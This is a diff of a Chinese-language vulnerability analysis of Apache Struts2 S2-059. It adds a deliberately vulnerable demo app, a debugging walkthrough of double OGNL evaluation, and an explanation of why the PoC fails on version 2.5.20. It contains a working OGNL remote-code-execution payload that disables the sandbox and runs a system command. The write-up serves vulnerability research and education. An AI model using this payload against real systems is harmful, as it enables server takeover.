@@ -1,4 +1,4 @@
-# struts2历史漏洞回顾与分析
+# struts2历史高危漏洞分析
 
 原文连载地址：https://github.com/fa1c0n1/m01e-wiki/blob/main/Web%E9%80%9A%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/java/struts2/struts2%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90.md
 
@@ -1351,12 +1351,132 @@ ${
 <a name="s2-059"></a>
 ## S2-059
 
+官方漏洞公告：https://cwiki.apache.org/confluence/display/WW/S2-059
+
+影响版本：`Struts 2.0.0` - `Struts 2.5.20`
+
 ## 漏洞复现与分析
 
+从漏洞公告可获悉，该漏洞的场景是：当Struts2的标签属性值引用了`action`对象的参数值时，便会出现OGNL表达式的二次解析，从而产生RCE风险。
 
+>**注**：虽然官方漏洞公告里说该漏洞影响到`2.5.20`版本，但实际上公开的用于`2.5.16`版本的命令执行的PoC在`2.5.20`版本则失效。原因后面会说到。
+
+下面使用Struts2 `2.5.16`版本进行复现、分析和调试。构造一个符合条件的应用，关键代码如下
+
+`index.jsp`
+```jsp
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
+<%@ taglib prefix="s" uri="/struts-tags" %>
+<html>
+<head>
+    <title>S2-059 demo</title>
+</head>
+<body>
+<s:a id="%{id}">your input id: ${id}
+    <br>has ben evaluated again in id attribute
+</s:a>
+</body>
+</html>
+```
+
+`struts.xml`
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE struts PUBLIC
+        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
+        "http://struts.apache.org/dtds/struts-2.0.dtd">
+
+<struts>
+    <constant name="struts.devMode" value="false"/>
+
+    <package name="default" namespace="/" extends="struts-default">
+        <default-action-ref name="index"/>
+        <action name="index" class="org.pwntester.action.IndexAction" method="changeId">
+            <result>index.jsp</result>
+        </action>
+    </package>
+</struts>
+```
+
+`IndexAction.java`
+```java
+public class IndexAction extends ActionSupport {
+    private String id;
+
+    public IndexAction() {}
+    public String changeId() {
+        return "success";
+    }
+    public String getId() {
+        return this.id;
+    }
+    public void setId(String id) {
+        this.id = id;
+    }
+}
+```
+
+这里我们根据漏洞公告中的示例，使用`<s:a>`标签，并在标签中使用`id`属性来引用`action`中的参数值。
+
+因此我们可以将断点下在`<s:a>`对应的标签类`AnchorTag`的`doStartTag()`方法中(实际调用的是父类方法`ComponentTagSupport#doStartTag()`)，然后进行调试。
+
+<img src="pic/struts2_s2-059_1.png">
+
+跟进`AnchorTag#populateParams()`方法，在其父类`AbstractUITag#populateParams()`方法中发现调用`Anchor#setId()`对`id`属性进行设置。
+
+<img src="pic/struts2_s2-059_2.png">
+
+跟进`Anchor#setId()`，`Anchor`会调用父类方法`Component#findValue()`，在该方法中，如果`altSyntax`特性是开启的(`altSyntax`默认开启)，且`id`属性的值是一个符合`%{}`形式的表达式的情况下，会调用我们熟悉的`TextParseUtil.translateVariables()`进行OGNL表达式求值，求值的过程就是从`IndexAction`对象中通过`getter`方法来获取其`id`属性的值，即我们传入的`id`参数的值。
+
+<img src="pic/struts2_s2-059_3.png">
+
+到此，`<s:a id=%{id}>`标签的`id`属性就被赋值好了，即第一次的OGNL表达式求值就完成了。
+
+再次回到`ComponentTagSupport#doStartTag()`方法中继续跟进，发现调用`Anchor#start()`方法，跟进该方法。一直跟进，发现在`UIBean#populateComponentHtmlId()`方法中，调用`Component#findStringIfAltSyntax()`对`Anchor`对象的`id`属性值进行处理，如下图：
+
+<img src="pic/struts2_s2-059_4.png">
+
+跟进去，发现最终在`Component#findValue()`方法中又看到了熟悉的`TextParseUtil.translateVariables()`。跟到这里就是第二次OGNL表达式求值，如下图：
+
+<img src="pic/struts2_s2-059_5.png">
+
+到此漏洞原理的部分就结束了。下面说一下命令执行PoC的构造。
 
 ## 可回显PoC
 
+在Struts2 `2.5.16`版本，直接使用S2-057的PoC便可，但最前面的`$`符号要改为`%`。同样是发送两次请求。
+
+```
+%{
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(#ct=#request['struts.valueStack'].context).
+(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).
+(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ou.setExcludedPackageNames('')).(#ou.setExcludedClasses('')).
+(#ct.setMemberAccess(#dm)).
+(#a=@java.lang.Runtime@getRuntime().exec('id')).
+(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))
+}
+```
+
+<img src="pic/struts2_s2-059_6.png">
+
+接着说一下为什么该命令执行PoC在Struts2 `2.5.20`版本中失效。
+
+**1、Struts2 `2.5.20`的类和包名的黑名单扩充了**，如下：
+
+<img src="pic/struts2_s2-059_7.png">
+
+其中增加了包名`com.opensymphony.xwork2.ognl`，导致无法通过`#request['struts.valueStack'].context`或`#attr['struts.valueStack'].context`来获取上下文对象。因为`OgnlRuntime#getFieldValue()`方法中有引入沙盒保护，会禁止黑名单里的类的对象去获取成员属性。
+
+<img src="pic/struts2_s2-059_8.png">
+
+
+**2、`OgnlRuntime#getStaticField()`方法也引入了Struts2的沙盒保护**
+
+Struts2 `2.5.16`版本所依赖的`ognl`库的版本为`3.1.15`，Struts2 `2.5.20`版本依赖的`ognl`库的版本为`3.1.21`。在`ognl-3.1.21`的类`OgnlRuntime#getStaticField()`中也引入了Struts2的沙盒进行保护，禁止黑名单类去获取静态属性。关键代码如下：
+
+<img src="pic/struts2_s2-059_9.png">
 
 
 ## 漏洞修复
@@ -1383,4 +1503,4 @@ ${
 [3] hxxps://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/ <br>
 [4] hxxps://securitylab.github.com/research/apache-struts-CVE-2018-11776/ <br>
 [5] 《Struts2技术内幕：深入解析Struts2架构设计与实现原理》- 作者:陆舟 <br>
-
+[6] hxxps://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf <br>
